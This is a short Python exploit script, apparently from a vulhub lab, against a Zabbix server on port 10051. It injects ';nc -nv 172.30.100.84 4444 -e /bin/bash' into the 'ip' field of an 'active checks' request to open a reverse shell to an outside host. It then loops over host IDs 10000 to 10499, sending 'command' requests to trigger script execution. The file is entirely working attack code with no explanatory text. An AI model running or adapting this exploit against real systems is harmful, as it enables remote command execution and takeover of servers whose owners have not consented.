import socket
import json
import sys


def send(ip, data):
    try:
        conn = socket.create_connection((ip, 10051), 10)
        conn.send(json.dumps(data).encode())
        data = conn.recv(2048)
        conn.close()
    except socket.timeout :
        print("May have received the shell")
        exit()

    return data


target = sys.argv[1]
while(True):
    print(send(target, {"request":"active checks","host":"vulhub","ip":";nc -nv 172.30.100.84 4444 -e /bin/bash"}))
    for i in range(10000, 10500):
        data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
        if data and b'failed' not in data:
            print('hostid: %d' % i)
            print(data)

            # if json.loads(data.decode())['data'].startswith('BusyBox'):
            #     print("success")
            #     exit()



